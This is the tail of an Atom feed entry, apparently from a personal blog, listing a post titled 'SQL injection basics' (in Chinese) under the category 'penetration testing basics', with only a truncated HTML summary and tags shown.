    <summary type="html">&lt;h1 id=&quot;sql注入基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sql注入基础&quot;&gt;&lt;/a&gt; SQL注入基础&lt;/h1&gt;
&lt;img src=&quot;/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/22</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
